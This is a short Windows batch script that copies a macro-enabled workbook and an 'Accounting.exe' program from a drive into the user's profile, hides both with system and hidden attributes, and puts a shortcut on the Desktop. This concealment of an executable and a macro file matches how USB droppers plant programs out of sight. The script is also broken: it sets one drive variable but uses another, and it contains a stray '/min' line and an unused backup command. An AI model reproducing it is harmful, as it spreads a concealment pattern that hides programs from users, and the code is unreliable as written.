@echo off
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y 

xcopy "%drive%\create_database1.xlsm" "%USERPROFILE%\" 
attrib "%USERPROFILE%\create_database1.xlsm" +s +h

xcopy "%drive%\Accounting.exe" "%USERPROFILE%\" 
attrib "%USERPROFILE%\Accounting.exe" +s +h

xcopy "%drive%\Accounting - Shortcut.lnk" "%USERPROFILE%\Desktop\" 


@echo off
cls
exit /b